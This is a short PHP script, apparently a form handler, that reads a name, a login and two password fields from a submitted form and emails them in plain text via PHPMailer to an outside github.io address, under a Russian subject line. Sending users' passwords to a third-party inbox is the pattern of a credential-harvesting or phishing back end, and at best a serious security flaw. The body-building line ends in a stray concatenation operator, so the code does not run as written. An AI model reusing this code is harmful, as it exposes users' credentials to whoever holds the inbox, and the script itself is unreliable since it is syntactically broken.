<?php
	use PHPMailer\PHPMailer\PHPMailer;

	require "PHPMailer/Exception.php";
	require "PHPMailer/PHPMailer.php";

	$sendMessage = new PHPMailer(true);
	$sendMessage->CharSet = 'UTF-8';
	$name = $_POST["name"];
	$login = $_POST["login"];
	$password1 = $_POST["password1"];
	$password2 = $_POST["password2"];

	$body = $name. ' ' .$login. ' ' .$password1. ' ' .$password2.;
	$sendMessage->Subject = 'Привет! Это "Фрилансер по жизни';

	$sendMessage->addAddress('kaxa0308super@kaxadontstarve.github.io');
	$sendMessage->Body = $body;

	$sendMessage->send();
?>
